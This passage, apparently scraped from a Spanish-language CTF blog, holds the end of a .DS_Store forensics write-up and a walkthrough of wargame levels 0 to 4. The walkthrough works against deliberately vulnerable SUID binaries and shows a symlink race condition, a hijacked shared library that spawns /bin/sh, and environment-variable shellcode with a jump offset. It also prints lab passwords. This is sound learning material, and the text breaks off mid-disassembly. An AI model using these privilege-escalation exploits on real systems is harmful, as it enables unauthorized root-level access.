macOS:\n$ file flag.zip flag.zip: Zip archive data, at least v2.0 to extract, compression method=store $ unzip -v flag.zip Archive: flag.zip Length Method Size Cmpr Date Time CRC-32 Name -------- ------ ------- ---- ---------- ----- -------- ---- 0 Stored 0 0% 07-03-2022 05:49 00000000 flag/ 86710 Defl:N 86391 0% 07-03-2022 05:29 a0cfb753 flag/flag.jpg 719 Defl:N 419 42% 07-03-2022 05:29 58f33cf2 __MACOSX/flag/._flag.jpg 6148 Defl:N 283 95% 07-03-2022 05:48 c093d238 flag/.DS_Store 120 Defl:N 53 56% 07-03-2022 05:48 38c0880b __MACOSX/flag/._.DS_Store -------- ------- --- ------- 93697 87146 7% 5 files $ unzip flag.zip Archive: flag.zip creating: flag/ inflating: flag/flag.jpg inflating: __MACOSX/flag/._flag.jpg inflating: flag/.DS_Store inflating: __MACOSX/flag/._.DS_Store  Estos archivos temporales contienen información útil en cuanto a directorios y nombres de archivos. Podemos extraer la información simplemente con cat:\n$ cat flag/.DS_Store .jpgIloflag.jpgIlocblob�������!ictf{mac_is_better_than_templeos}Ilocblob�������� @� @ @ @ DSDB ` @ @ @  O usando una herramienta llamada Python-dsstore:\n$ python3 main.py flag/.DS_Store Count: 2 flag.jpg ictf{mac_is_better_than_templeos}  ","image":"/images/forensics.png","permalink":"https://7rocky.github.io/ctf/imaginaryctf/lost-flag/","section":"ctf","summary":"ImaginaryCTF 04/07/2022. 75 puntos. Archivo ZIP. macOS (.DS_Store)","time":0,"title":"Lost Flag"},{"contents":"Este laboratorio sirve para practicar técnicas de explotación, programación e ingeniería inversa. El laboratorio consta de 9 niveles, en una arquitectura Linux/x86 (todas las protecciones están deshabilitadas: NX, PIE, canarios e incluso ASLR).\nPara conectarse al primer nivel, se nos proporcionan las credenciales de SSH para el usuario maze0.\nRealizando un reconocimiento inicial, la máquina nos muestra que hay binarios SUID que deben ser explotados para pasar al siguiente nivel. Además, tenemos algunos archivos que contienen las contraseñas de los usuarios mazeX:\nmaze0@maze:~$ ls -lh /maze total 88K -r-sr-x--- 1 maze1 maze0 8.1K Aug 26 2019 maze0 -r-sr-x--- 1 maze2 maze1 7.2K Aug 26 2019 maze1 -r-sr-x--- 1 maze3 maze2 7.3K Aug 26 2019 maze2 -r-sr-x--- 1 maze4 maze3 732 Aug 26 2019 maze3 -r-sr-x--- 1 maze5 maze4 10K Aug 26 2019 maze4 -r-sr-x--- 1 maze6 maze5 9.2K Aug 26 2019 maze5 -r-sr-x--- 1 maze7 maze6 8.0K Aug 26 2019 maze6 -r-sr-x--- 1 maze8 maze7 9.7K Aug 26 2019 maze7 -r-sr-x--- 1 maze9 maze8 12K Aug 26 2019 maze8 maze0@maze:~$ ls -lh /etc/maze_pass total 40 -r-------- 1 maze0 maze0 6 Aug 26 2019 maze0 -r-------- 1 maze1 maze1 11 Aug 26 2019 maze1 -r-------- 1 maze2 maze2 11 Aug 26 2019 maze2 -r-------- 1 maze3 maze3 11 Aug 26 2019 maze3 -r-------- 1 maze4 maze4 11 Aug 26 2019 maze4 -r-------- 1 maze5 maze5 11 Aug 26 2019 maze5 -r-------- 1 maze6 maze6 11 Aug 26 2019 maze6 -r-------- 1 maze7 maze7 11 Aug 26 2019 maze7 -r-------- 1 maze8 maze8 11 Aug 26 2019 maze8 -r-------- 1 maze9 maze9 11 Aug 26 2019 maze9  Los permisos de los archivos están debidamente configurados para que todo funcione en cada nivel.\nNivel 0 -\u0026gt; 1 Nos podemos transferir /maze/maze0 a nuestra máquina copiando el archivo codificado en Base64. Luego lo podemos abrir con Ghidra para obtener el código en C descompilado:\nint main(int argc, char **argv) { int iVar1; __uid_t __suid; __uid_t __euid; __uid_t __ruid; char buf[20]; int fd; memset(buf, 0, 0x14); iVar1 = access(\"/tmp/128ecf542a35ac5270a87dc740918404\", 4); if (iVar1 == 0) { __suid = geteuid(); __euid = geteuid(); __ruid = geteuid(); setresuid(__ruid, __euid, __suid); iVar1 = open(\"/tmp/128ecf542a35ac5270a87dc740918404\", 0); if (iVar1 \u0026lt; 0) { /* WARNING: Subroutine does not return */ exit(-1); } read(iVar1, buf, 0x13); write(1, buf, 0x13); } return 0; }  Vemos que está accediendo a un archivo en /tmp/128ecf542a35ac5270a87dc740918404. Si el acceso es correcto, lee su contenido y lo imprime por la salida estándar (stdout).\nVeamos qué permisos tenemos en /tmp:\nmaze0@maze:~$ ls -l --time-style=+ / total 148 drwxr-xr-x 2 root root 4096 bin drwxr-xr-x 4 root root 4096 boot dr-xr-xr-x 3 root root 0 cgroup2 drwxr-xr-x 14 root root 4020 dev drwxr-xr-x 88 root root 4096 etc drwxr-xr-x 12 root root 4096 home lrwxrwxrwx 1 root root 29 initrd.img - boot/initrd.img-4.9.0-6-amd64 lrwxrwxrwx 1 root root 29 initrd.img.old - boot/initrd.img-4.9.0-6-amd64 drwxr-xr-x 16 root root 4096 lib drwxr-xr-x 2 root root 4096 lib32 drwxr-xr-x 2 root root 4096 lib64 drwxr-xr-x 2 root root 4096 libx32 drwx------ 2 root root 16384 lost+found drwxr-xr-x 2 root root 4096 maze drwxr-xr-x 3 root root 4096 media drwxr-xr-x 2 root root 4096 mnt drwxr-xr-x 2 root root 4096 opt dr-xr-xr-x 106 root root 0 proc lrwxrwxrwx 1 root root 9 README.txt - /etc/motd drwx------ 8 root root 4096 root drwxr-xr-x 15 root root 580 run drwxr-xr-x 2 root root 4096 sbin drwxr-xr-x 3 root root 4096 share drwxr-xr-x 2 root root 4096 srv dr-xr-xr-x 12 root root 0 sys drwxrws-wt 1243 root root 57344 tmp drwxr-xr-x 12 root root 4096 usr drwxr-xr-x 11 root root 4096 var lrwxrwxrwx 1 root root 26 vmlinuz - boot/vmlinuz-4.9.0-6-amd64 lrwxrwxrwx 1 root root 26 vmlinuz.old - boot/vmlinuz-4.9.0-6-amd64  No podemos listar el contenido de /tmp, pero sí podemos escribir. Entonces, creamos un archivo llamado /tmp/128ecf542a35ac5270a87dc740918404 y volvemos a ejecutar el binario:\nmaze0@maze:~$ echo ASDF  /tmp/128ecf542a35ac5270a87dc740918404 maze0@maze:~$ /maze/maze0 ASDF  La idea es crear un enlace simbólico de manera que /tmp/128ecf542a35ac5270a87dc740918404 apunte a /etc/maze_pass/maze1 y leerlo utilizando el binario:\nmaze0@maze:~$ ln -s /etc/maze_pass/maze1 /tmp/128ecf542a35ac5270a87dc740918404 maze0@maze:~$ ls -l --time-style=+ /tmp/128ecf542a35ac5270a87dc740918404 lrwxrwxrwx 1 maze0 root 20 /tmp/128ecf542a35ac5270a87dc740918404 - /etc/maze_pass/maze1 maze0@maze:~$ /maze/maze0  Mediante ltrace, vemos que access está devolviendo -1, por lo que el archivo no se está leyendo:\nmaze0@maze:~$ ltrace /maze/maze0 __libc_start_main(0x804854b, 1, 0xffffd7a4, 0x80485e0 \u0026lt;unfinished ...\u0026gt; memset(0xffffd6e8, '\\0', 20) = 0xffffd6e8 access(\"/tmp/128ecf542a35ac5270a87dc7409\"..., 4) = -1 +++ exited (status 0) +++  Aunque no somos capaces de pasar de la función access en circunstancias normales, existe una condición de carrera (race condition). La idea es pasar de la función access vinculando /tmp/128ecf542a35ac5270a87dc740918404 a un archivo al cual tengamos permisos de lectura (por ejemplo, /etc/maze_pass/maze0) y justo después vincularlo a /etc/maze_pass/maze1, de manera que haya una situación en la que podamos abrir el segundo archivo y leerlo.\nPor tanto, necesitamos este bucle en una sesión:\nmaze0@maze:~$ while true; do ln -sf /etc/maze_pass/maze0 /tmp/128ecf542a35ac5270a87dc740918404; ln -sf /etc/maze_pass/maze1 /tmp/128ecf542a35ac5270a87dc740918404; done  Y este otro bucle en otra sesión:\nmaze0@maze:~$ while true; do /maze/maze0; done  Después de algunos segundos, veremos la contraseña:\nmaze0@maze:~$ while true; do /maze/maze0; done -bash: fork: retry: Resource temporarily unavailable ... -bash: fork: retry: Resource temporarily unavailable hashaachon -bash: fork: retry: Resource temporarily unavailable ^C-bash: fork: Interrupted system call  Nivel 1 -\u0026gt; 2 Si cogemos /maze/maze1 y lo abrimos en Ghidra, vemos esta función main de \u0026ldquo;Hola mundo\u0026rdquo;:\nint main() { puts(\"Hello World!\\n\"); return 0; }  Sin embargo, hay un problema si lo ejecutamos. El binario está buscando una librería llamada libc.so.4 en el directorio actual:\nmaze1@maze:~$ /maze/maze1 /maze/maze1: error while loading shared libraries: ./libc.so.4: cannot open shared object file: No such file or directory maze1@maze:~$ ldd /maze/maze1 linux-gate.so.1 (0xf7fd7000) ./libc.so.4 = not found libc.so.6 = /lib32/libc.so.6 (0xf7e12000) /lib/ld-linux.so.2 (0xf7fd9000)  Por tanto, para ejecutar el binario, necesitamos poner una librería válida en el directorio actual. Por ejemplo, podemos decirle al binario que puts tiene la siguiente funcionalidad:\n#include \u0026lt;stdlib.h\u0026gt; int puts(const char *s) { system(\"/bin/sh\"); return 0; }  Como resultado, al ejecutar el binario, tendremos una shell como maze2 (porque el binario es SUID y pertenece al usuario maze2).\nVamos a escribir el código y compilarlo en /tmp, porque tenemos permisos de escritura:\nmaze1@maze:~$ cd /tmp maze1@maze:/tmp$ vim lib.c maze1@maze:/tmp$ cat lib.c #include \u0026lt;stdlib.h\u0026gt; int puts(const char *s) { system(\"/bin/sh\"); return 0; }  Esta es la forma de compilar una librería compartida:\nmaze1@maze:/tmp$ gcc -m32 -shared -fpic lib.c -o libc.so.4  Ahora ejecutamos el binario desde el directorio actual y obtenemos una consola de comandos y la contraseña del siguiente usuario:\nmaze1@maze:/tmp$ /maze/maze1 $ whoami maze2 $ cat /etc/maze_pass/maze2 fooghihahr  Nivel 2 -\u0026gt; 3 La función main del código fuente descompilado de /maze/maze2 es bastante interesante:\nint main(int argc, char **argv) { char code[8]; anon_subr_void_varargs *fp; if (argc != 2) { /* WARNING: Subroutine does not return */ exit(1); } strncpy(code, argv[1], 8); (*(code *) code)(); return 0; }  Básicamente, está tomando 8 bytes de un argumento y ejecutando dichos bytes.\nRecordemos que este laboratorio tiene todas las protecciones deshabilitadas (NX, PIE, canarios e incluso ASLR). Por tanto, tenemos que encontrar una manera de ejecutar código malicioso.\nPero 8 bytes no son suficientes para poner shellcode válido. Sin embargo, podemos utilizar variables de entorno.\nLa pila (stack) se llenará con todas las variables de entorno de la sesión de consola actual. Por tanto, podemos utilizar una instrucción de salto en los 8 bytes que debemos poner como argumento y saltar a la pila en la posición de cierta variable de entorno.\nVamos a probarlo con GDB en el servidor:\nmaze2@maze:~$ export AAAA=BBBBBBBB maze2@maze:~$ gdb -q /maze/maze2 Reading symbols from /maze/maze2...done. (gdb) break main Breakpoint 1 at 0x8048421: file maze2.c, line 22. (gdb) run CCCCCCCC Starting program: /maze/maze2 CCCCCCCC Breakpoint 1, main (argc=2, argv=0xffffd764) at maze2.c:22 22 maze2.c: No such file or directory.  Perfecto, veamos en qué posición se encuentra la variable AAAA=BBBBBBBB en la pila:\n(gdb) info proc mapping process 20960 Mapped address spaces: Start Addr End Addr Size Offset objfile 0x8048000 0x8049000 0x1000 0x0 /maze/maze2 0x8049000 0x804a000 0x1000 0x0 /maze/maze2 0xf7e10000 0xf7e12000 0x2000 0x0 0xf7e12000 0xf7fc3000 0x1b1000 0x0 /lib32/libc-2.24.so 0xf7fc3000 0xf7fc5000 0x2000 0x1b0000 /lib32/libc-2.24.so 0xf7fc5000 0xf7fc6000 0x1000 0x1b2000 /lib32/libc-2.24.so 0xf7fc6000 0xf7fc9000 0x3000 0x0 0xf7fd2000 0xf7fd4000 0x2000 0x0 0xf7fd4000 0xf7fd7000 0x3000 0x0 [vvar] 0xf7fd7000 0xf7fd9000 0x2000 0x0 [vdso] 0xf7fd9000 0xf7ffc000 0x23000 0x0 /lib32/ld-2.24.so 0xf7ffc000 0xf7ffd000 0x1000 0x22000 /lib32/ld-2.24.so 0xf7ffd000 0xf7ffe000 0x1000 0x23000 /lib32/ld-2.24.so 0xfffdd000 0xffffe000 0x21000 0x0 [stack] (gdb) find 0xfffdd000, 0xffffe000 - 1, \"AAAA=BBBBBBBB\" 0xffffdf27 1 pattern found. (gdb) x/s 0xffffdf27 0xffffdf27: \"AAAA=BBBBBBBB\"  Y ahí la tenemos. Ahora, identificamos la dirección de la instrucción que ejecuta los 8 bytes (0x0804844e) y ponemos un breakpoint:\n(gdb) disassemble main Dump of assembler code for function main: 0x0804841b \u0026lt;+0\u0026gt;: push %ebp 0x0804841c \u0026lt;+1\u0026gt;: mov %esp,%ebp 0x0804841e \u0026lt;+3\u0026gt;: sub $0xc,%esp =\u0026gt; 0x08048421 \u0026lt;+6\u0026gt;: lea -0xc(%ebp),%eax 0x08048424 \u0026lt;+9\u0026gt;: mov %eax,-0x4(%ebp) 0x08048427 \u0026lt;+12\u0026gt;: cmpl $0x2,0x8(%ebp) 0x0804842b \u0026lt;+16\u0026gt;: je 0x8048434 \u0026lt;main+25\u0026gt; 0x0804842d \u0026lt;+18\u0026gt;: push $0x1 0x0804842f \u0026lt;+20\u0026gt;: call 0x80482e0 \u0026lt;exit@plt\u0026gt; 0x08048434 \u0026lt;+25\u0026gt;: mov 0xc(%ebp),%eax 0x08048437 \u0026lt;+28\u0026gt;: add $0x4,%eax 0x0804843a \u0026lt;+31\u0026gt;: mov (%eax),%eax 0x0804843c \u0026lt;+33\u0026gt;: push $0x8 0x0804843e \u0026lt;+35\u0026gt;: push %eax 0x0804843f \u0026lt;+36\u0026gt;: lea -0xc(%ebp),%eax 0x08048442 \u0026lt;+39\u0026gt;: push %eax 0x08048443 \u0026lt;+40\u0026gt;: call 0x8048300 \u0026lt;strncpy@plt\u0026gt; 0x08048448 \u0026lt;+45\u0026gt;: add $0xc,%esp 0x0804844b \u0026lt;+48\u0026gt;: mov -0x4(%ebp),%eax 0x0804844e \u0026lt;+51\u0026gt;: call *%eax 0x08048450 \u0026lt;+53\u0026gt;: mov $0x0,%eax 0x08048455 \u0026lt;+58\u0026gt;: leave 0x08048456 \u0026lt;+59\u0026gt;: ret End of assembler dump. (gdb) break *0x0804844e Breakpoint 2 at 0x804844e: file maze2.c, line 26. (gdb) continue Continuing. Breakpoint 2, 0x0804844e in main (argc=2, argv=0xffffd764) at maze2.c:26 26 in maze2.c  En este punto, podemos ver qué dirección contiene $eax:\n(gdb) p/x $eax $1 = 0xffffd6bc  Por tanto, podemos utilizar una instrucción de salto a otra dirección utilizando un offset relativo a la dirección actual. Este es el offset que necesitamos (nótese que el número 5 viene de la longitud de AAAA=):\n(gdb) p/x 0xffffdf27 + 5 - 0xffffd6bc $2 = 0x870  La instrucción de ensamblador que utilizaremos y su código máquina correspondiente es:\nmaze2@maze:~$ pwn asm 'jmp $+0x870' -f string '\\xe9k\\x08\\x00\\x00'  Para verificar que funciona, podemos poner varios \\xcc (instrucción de breakpoint, SIGTRAP) en la variable de entorno. Y vemos que la ejecución se detiene, por lo que funciona bien:\nmaze2@maze:~$ export AAAA=$(python -c 'print \"\\xcc\" * 20') maze2@maze:~$ gdb -q /maze/maze2 Reading symbols from /maze/maze2...done. (gdb) run $(pwn asm 'jmp $+0x870' -f raw) Starting program: /maze/maze2 $(pwn asm 'jmp $+0x870' -f raw) /bin/bash: warning: command substitution: ignored null byte in input Program received signal SIGTRAP, Trace/breakpoint trap. 0xffffdf2d in ?? ()  Ahora cogemos un shellcode de Linux x86 como este: https://www.exploit-db.com/exploits/42428 y lo asignamos a la variable de entorno, añadiendo instrucciones nop al principio por si la pila se modifica o el salto no se produce exactamente al principio del shellcode.\nEn GDB funciona, pero no utiliza los permisos SUID:\nmaze2@maze:~$ gdb -q /maze/maze2 Reading symbols from /maze/maze2...done. (gdb) run $(pwn asm 'jmp $+0x870' -f raw) Starting program: /maze/maze2 $(pwn asm 'jmp $+0x870' -f raw) /bin/bash: warning: command substitution: ignored null byte in input process 24019 is executing new program: /bin/dash $ whoami maze2  Fuera de GDB no funciona:\nmaze2@maze:~$ export AAAA=$(python -c 'print \"\\x90\" * 20 + \"\\x31\\xc9\\x6a\\x0b\\x58\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd\\x80\"') maze2@maze:~$ /maze/maze2 $(pwn asm 'jmp $+0x870' -f raw) -bash: warning: command substitution: ignored null byte in input Segmentation fault  Esto ocurre porque GDB añade más datos a la pila, por lo que necesitamos reducir el offset de la instrucción de salto hasta que consigamos una shell:\nmaze2@maze:~$ /maze/maze2 $(pwn asm 'jmp $+0x870' -f raw) -bash: warning: command substitution: ignored null byte in input Segmentation fault maze2@maze:~$ /maze/maze2 $(pwn asm 'jmp $+0x860' -f raw) -bash: warning: command substitution: ignored null byte in input Segmentation fault maze2@maze:~$ /maze/maze2 $(pwn asm 'jmp $+0x850' -f raw) -bash: warning: command substitution: ignored null byte in input $ whoami maze3 $ cat /etc/maze_pass/maze3 beinguthok  Nivel 3 -\u0026gt; 4 En este nivel, encontramos un binario que se comporta de manera diferente si ponemos un argumento o no:\nmaze3@maze:~$ /maze/maze3 asdf maze3@maze:~$ /maze/maze3 ./level4 ev0lcmds!  Mediante strace vemos que si no hay argumentos, el programa termina. Y si añadimos un argumento, sucede algo más:\nmaze3@maze:~$ strace /maze/maze3 execve(\"/maze/maze3\", [\"/maze/maze3\"], [/* 17 vars */]) = 0 strace: [ Process PID=30847 runs in 32 bit mode. ] write(1, \"./level4 ev0lcmds!\\n\\0\", 20./level4 ev0lcmds! ) = 20 exit(1) = ? +++ exited with 1 +++ maze3@maze:~$ strace /maze/maze3 asdf execve(\"/maze/maze3\", [\"/maze/maze3\", \"asdf\"], [/* 17 vars */]) = 0 strace: [ Process PID=30844 runs in 32 bit mode. ] mprotect(0x8048000, 151, PROT_READ|PROT_WRITE|PROT_EXEC) = 0 exit(1) = ? +++ exited with 1 +++  Curiosamente, el programa utiliza mprotect para cambiar los permisos de las direcciones del binario a rwx (lectura, escritura y ejecución).\nVeamos qué tenemos con GDB:\nmaze3@maze:~$ gdb -q /maze/maze3 Reading symbols from /maze/maze3...(no debugging symbols found)...done. (gdb) set pagination off (gdb) disassemble _start Dump of assembler code for function _start: 0x08048060 \u0026lt;+0\u0026gt;: pop %eax 0x08048061 \u0026lt;+1\u0026gt;: dec %eax 0x08048062 \u0026lt;+2\u0026gt;: jne 0x8048096 \u0026lt;fine\u0026gt; 0x08048064 \u0026lt;+4\u0026gt;: call 0x804807d \u0026lt;_start+29\u0026gt; 0x08048069 \u0026lt;+9\u0026gt;: cs das 0x0804806b \u0026lt;+11\u0026gt;: insb (%dx),%es:(%edi) 0x0804806c \u0026lt;+12\u0026gt;: gs jbe 0x80480d4 \u0026lt;d1+9\u0026gt; 0x0804806f \u0026lt;+15\u0026gt;: insb (%dx),%es:(%edi) 0x08048070 \u0026lt;+16\u0026gt;: xor $0x20,%al 0x08048072 \u0026lt;+18\u0026gt;: gs jbe 0x80480a5 \u0026lt;fine+15\u0026gt; 0x08048075 \u0026lt;+21\u0026gt;: insb (%dx),%es:(%edi) 0x08048076 \u0026lt;+22\u0026gt;: arpl %bp,0x64(%ebp) 0x08048079 \u0026lt;+25\u0026gt;: jae 0x804809c \u0026lt;fine+6\u0026gt; 0x0804807b \u0026lt;+27\u0026gt;: or (%eax),%al 0x0804807d \u0026lt;+29\u0026gt;: mov $0x4,%eax 0x08048082 \u0026lt;+34\u0026gt;: mov $0x1,%ebx 0x08048087 \u0026lt;+39\u0026gt;: pop %ecx 0x08048088 \u0026lt;+40\u0026gt;: mov $0x14,%edx 0x0804808d \u0026lt;+45\u0026gt;: int $0x80 0x0804808f \u0026lt;+47\u0026gt;: mov $0x1,%eax 0x08048094 \u0026lt;+52\u0026gt;: int $0x80 End of assembler dump.  Desde la función _start, solamente nos ocupamos de la llamada a fine:\n(gdb) disassemble fine Dump of assembler code for function fine: 0x08048096 \u0026lt;+0\u0026gt;: pop %eax 0x08048097 \u0026lt;+1\u0026gt;: mov $0x7d,%eax 0x0804809c \u0026lt;+6\u0026gt;: mov $0x8048060,%ebx 0x080480a1 \u0026lt;+11\u0026gt;: and $0xfffff000,%ebx 0x080480a7 \u0026lt;+17\u0026gt;: mov $0x97,%ecx 0x080480ac \u0026lt;+22\u0026gt;: mov $0x7,%edx 0x080480b1 \u0026lt;+27\u0026gt;: int $0x80 0x080480b3 \u0026lt;+29\u0026gt;: lea 0x80480cb,%esi 0x080480b9 \u0026lt;+35\u0026gt;: mov %esi,%edi 0x080480bb \u0026lt;+37\u0026gt;: mov $0x2c,%ecx 0x080480c0 \u0026lt;+42\u0026gt;: mov $0x12345678,%edx End of assembler dump.  Ahora ponemos un breakpoint en la última instrucción y ejecutamos el código con un argumento cualquiera:\n(gdb) break *0x080480c0 Breakpoint 1 at 0x80480c0 (gdb) run asdf Starting program: /maze/maze3 asdf Breakpoint 1, 0x080480c0 in fine ()  Continuamos una instrucción y desensamblamos el bloque actual para ver qué está haciendo el programa:\n(gdb) stepi 0x080480c5 in l1 () (gdb) disassemble Dump of assembler code for function l1: =\u0026gt; 0x080480c5 \u0026lt;+0\u0026gt;: lods %ds:(%esi),%eax 0x080480c6 \u0026lt;+1\u0026gt;: xor %edx,%eax 0x080480c8 \u0026lt;+3\u0026gt;: stos %eax,%es:(%edi) 0x080480c9 \u0026lt;+4\u0026gt;: loop 0x80480c5 \u0026lt;l1\u0026gt; End of assembler dump.  Está realizando una serie de operaciones en bucle (44 veces, que viene de un contador guardado como $ecx = 0x2c). Podemos añadir un breakpoint al final del bucle y utilizar continue 0x2a para detenernos cuando $ecx = 1:\n(gdb) break *0x080480c9 Breakpoint 2 at 0x80480c9 (gdb) continue Continuing. Breakpoint 2, 0x080480c9 in l1 () (gdb) p/x $ecx $2 = 0x2c (gdb) continue Continuing. Breakpoint 2, 0x080480c9 in l1 () (gdb) p/x $ecx $3 = 0x2b (gdb) continue 0x2a Will ignore next 41 crossings of breakpoint 2. Continuing. Breakpoint 2, 0x080480c9 in l1 () (gdb) p/x $ecx $4 = 0x1  Ahora si saltamos una instrucción, salimos del bucle. Y desensamblamos otro bloque:\n(gdb) stepi 0x080480cb in d1 () (gdb) disassemble Dump of assembler code for function d1: =\u0026gt; 0x080480cb \u0026lt;+0\u0026gt;: pop %eax 0x080480cc \u0026lt;+1\u0026gt;: cmpl $0x1337c0de,(%eax) 0x080480d2 \u0026lt;+7\u0026gt;: jne 0x80480ed \u0026lt;d1+34\u0026gt; 0x080480d4 \u0026lt;+9\u0026gt;: xor %eax,%eax 0x080480d6 \u0026lt;+11\u0026gt;: push %eax 0x080480d7 \u0026lt;+12\u0026gt;: push $0x68732f2f 0x080480dc \u0026lt;+17\u0026gt;: push $0x6e69622f 0x080480e1 \u0026lt;+22\u0026gt;: mov %esp,%ebx 0x080480e3 \u0026lt;+24\u0026gt;: push %eax 0x080480e4 \u0026lt;+25\u0026gt;: push %ebx 0x080480e5 \u0026lt;+26\u0026gt;: mov %esp,%ecx 0x080480e7 \u0026lt;+28\u0026gt;: xor %edx,%edx 0x080480e9 \u0026lt;+30\u0026gt;: mov $0xb,%al 0x080480eb \u0026lt;+32\u0026gt;: int $0x80 0x080480ed \u0026lt;+34\u0026gt;: mov $0x1,%eax 0x080480f2 \u0026lt;+39\u0026gt;: xor %ebx,%ebx 0x080480f4 \u0026lt;+41\u0026gt;: inc %ebx 0x080480f5 \u0026lt;+42\u0026gt;: int $0x80 End of assembler dump.  Este código puede parecer familiar al shellcode del nivel anterior (realmente, es muy parecido a este: https://www.exploit-db.com/exploits/43716). De hecho, las operaciones que son ejecutadas en el bucle están diseñadas para modificar las instrucciones del binario y añadir el shellcode.\nSin embargo, hay una comparación previa. Para ejecutar el shellcode el contenido de la dirección guardada en $eax tiene que ser igual a 0x1337c0de. Podemos ver su valor actual:\n(gdb) si 0x080480cc in d1 () (gdb) p/x $eax $5 = 0xffffd8b8 (gdb) x/s 0xffffd8b8 0xffffd8b8: \"asdf\"  Este es el argumento que le hemos pasado al programa.\nPor tanto, si ponemos 0x1337c0de en bytes como argumento, tendremos una consola de comandos como maze4:\nmaze3@maze:~$ /maze/maze3 $(echo -e \"\\xde\\xc0\\x37\\x13\") $ whoami maze4 $ cat /etc/maze_pass/maze4 deekaihiek  Nivel 4 -\u0026gt; 5 Esta vez tenemos un binario que comprueba el contenido de un archivo provisto antes de ejecutarlo:\nint main(int argc, char **argv) { int __fd; int iVar1; stat st; Elf32_Phdr phdr; Elf32_Ehdr ehdr; int fd; if (argc != 2) { printf(\"usage: %s file2check\\n\", *argv); /* WARNING: Subroutine does not return */ exit(-1); } __fd = open(argv[1], 0); if (__fd \u0026lt; 0) { perror(\"open\"); /* WARNING: Subroutine does not return */ exit(-1); } iVar1 = stat(argv[1], (stat *) \u0026amp;st); if (iVar1 \u0026lt; 0) { perror(\"stat\"); /* WARNING: Subroutine does not return */ exit(-1); } read(__fd, \u0026amp;ehdr, 0x34); lseek(__fd, ehdr.e_phoff, 0); read(__fd, \u0026amp;phdr, 0x20); if (phdr.p_paddr == (uint) ehdr.e_ident[8] * (uint) ehdr.e_ident[7] \u0026amp;\u0026amp; st.st_size \u0026lt; 0x78) { puts(\"valid file, executing\"); execv(argv[1], (char **) 0x0); } fwrite(\"file not executed\\n\", 1, 0x12, stderr); close(__fd); return 0; }  Vamos a crear un archivo sencillo en /tmp y vemos si lo ejecuta:\nmaze4@maze:~$ python3 -c 'print(\"\".join(chr(c) * 4 for c in range(0x41, 0x5b)))' AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ maze4@maze:~$ python3 -c 'print(\"\".join(chr(c) * 4 for c in range(0x41, 0x5b)))' \u0026lt; /tmp/file maze4@maze:~$ /maze/maze4 /tmp/file file not executed  No, veamos qué hace el programa con GDB. Primero, ponemos un breakpoint antes de lseek;\nmaze4@maze:~$ gdb -q /maze/maze4 Reading symbols from /maze/maze4...done. (gdb) set pagination off (gdb) disassemble main Dump of assembler code for function main: 0x080485fb \u0026lt;+0\u0026gt;: push %ebp 0x080485fc \u0026lt;+1\u0026gt;: mov %esp,%ebp 0x080485fe \u0026lt;+3\u0026gt;: sub $0xb0,%esp 0x08048604 \u0026lt;+9\u0026gt;: cmpl $0x2,0x8(%ebp) ... 0x0804868d \u0026lt;+146\u0026gt;: call 0x8048430 \u0026lt;read@plt\u0026gt; 0x08048692 \u0026lt;+151\u0026gt;: add $0xc,%esp 0x08048695 \u0026lt;+154\u0026gt;: mov -0x1c(%ebp),%eax 0x08048698 \u0026lt;+157\u0026gt;: push $0x0 0x0804869a \u0026lt;+159\u0026gt;: push %eax 0x0804869b \u0026lt;+160\u0026gt;: pushl -0x4(%ebp) 0x0804869e \u0026lt;+163\u0026gt;: call 0x8048450 \u0026lt;lseek@plt\u0026gt; 0x080486a3 \u0026lt;+168\u0026gt;: add $0xc,%esp 0x080486a6 \u0026lt;+171\u0026gt;: push $0x20 0x080486a8 \u0026lt;+173\u0026gt;: lea -0x58(%ebp),%eax 0x080486ab \u0026lt;+176\u0026gt;: push %eax 0x080486ac \u0026lt;+177\u0026gt;: pushl -0x4(%ebp) 0x080486af \u0026lt;+180\u0026gt;: call 0x8048430 \u0026lt;read@plt\u0026gt; 0x080486b4 \u0026lt;+185\u0026gt;: add $0xc,%esp 0x080486b7 \u0026lt;+188\u0026gt;: mov -0x4c(%ebp),%eax 0x080486ba \u0026lt;+191\u0026gt;: movzbl -0x31(%ebp),%edx 0x080486be \u0026lt;+195\u0026gt;: movzbl %dl,%ecx 0x080486c1 \u0026lt;+198\u0026gt;: movzbl -0x30(%ebp),%edx 0x080486c5 \u0026lt;+202\u0026gt;: movzbl %dl,%edx 0x080486c8 \u0026lt;+205\u0026gt;: imul %ecx,%edx 0x080486cb \u0026lt;+208\u0026gt;: cmp %edx,%eax 0x080486cd \u0026lt;+210\u0026gt;: jne 0x80486fa \u0026lt;main+255\u0026gt; 0x080486cf \u0026lt;+212\u0026gt;: mov -0x84(%ebp),%eax 0x080486d5 \u0026lt;+218\u0026gt;: cmp $0x77,%eax 0x080486d8 \u0026lt;+221\u0026gt;: jg 0x80486fa \u0026lt;main+255\u0026gt; 0x080486da \u0026lt;+223\u0026gt;: push $0x8048800 0x080486df \u0026lt;+228\u0026gt;: call 0x8048490 \u0026lt;puts@plt\u0026gt; 0x080486e4 \u0026lt;+233\u0026gt;: add $0x4,%esp 0x080486e7 \u0026lt;+236\u0026gt;: mov 0xc(%ebp),%eax 0x080486ea \u0026lt;+239\u0026gt;: add $0x4,%eax 0x080486ed \u0026lt;+242\u0026gt;: mov (%eax),%eax 0x080486ef \u0026lt;+244\u0026gt;: push $0x0 0x080486f1 \u0026lt;+246\u0026gt;: push %eax 0x080486f2 \u0026lt;+247\u0026gt;: call 0x80484d0 \u0026lt;execv@plt\u0026gt; 0x080486f7 \u0026lt;+252\u0026gt;: add $0x8,%esp 0x080486fa \u0026lt;+255\u0026gt;: mov 0x8049aa8,%eax 0x080486ff \u0026lt;+260\u0026gt;: push %eax 0x08048700 \u0026lt;+261\u0026gt;: push $0x12 0x08048702 \u0026lt;+263\u0026gt;: push $0x1 0x08048704 \u0026lt;+265\u0026gt;: push $0x8048816 0x08048709 \u0026lt;+270\u0026gt;: call 0x8048480 \u0026lt;fwrite@plt\u0026gt; 0x0804870e \u0026lt;+275\u0026gt;: add $0x10,%esp 0x08048711 \u0026lt;+278\u0026gt;: pushl -0x4(%ebp) 0x08048714 \u0026lt;+281\u0026gt;: call 0x80484e0 \u0026lt;close@plt\u0026gt; 0x08048719 \u0026lt;+286\u0026gt;: add $0x4,%esp 0x0804871c \u0026lt;+289\u0026gt;: mov $0x0,%eax 0x08048721 \u0026lt;+294\u0026gt;: 